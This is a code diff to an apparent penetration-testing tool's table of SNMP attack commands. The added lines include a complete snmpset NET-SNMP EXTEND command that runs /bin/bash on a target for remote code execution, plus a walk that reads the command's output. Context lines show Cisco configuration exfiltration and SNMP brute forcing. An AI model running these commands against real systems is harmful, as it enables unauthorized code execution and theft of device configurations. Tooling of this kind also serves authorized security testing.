@@ -4873,6 +4873,7 @@ _STEP_COMMANDS = {
         ],
         2: [
             "snmpwalk -v2c -c <COMMUNITY> <RHOST>",
+            "snmpbulkwalk -v2c -c <COMMUNITY> -Oa <RHOST> .   # much faster than snmpwalk",
             "snmp-check -c <COMMUNITY> <RHOST>",
         ],
         3: [
@@ -4883,7 +4884,8 @@ _STEP_COMMANDS = {
             "snmpwalk -v2c -c <COMMUNITY> <RHOST> 1.3.6.1.4.1.9.9.96   # Cisco config exfil",
         ],
         5: [
-            "snmpset -v2c -c <COMMUNITY> <RHOST> 'nsExtendStatus.\"pwn\"' i 4 ...   # NET-SNMP EXTEND → RCE",
+            "snmpset -v2c -c <COMMUNITY> <RHOST> 'NET-SNMP-EXTEND-MIB::nsExtendStatus.\"pwn\"' i 4 'NET-SNMP-EXTEND-MIB::nsExtendCommand.\"pwn\"' s /bin/bash 'NET-SNMP-EXTEND-MIB::nsExtendArgs.\"pwn\"' s '-c \"id\"'   # NET-SNMP EXTEND → RCE (RW community)",
+            "snmpwalk -v2c -c <COMMUNITY> <RHOST> 'NET-SNMP-EXTEND-MIB::nsExtendOutputFull.\"pwn\"'   # read command output",
         ],
         6: [
             "nmap -sU -p161 --script snmp-brute,snmpv3-* <RHOST>",
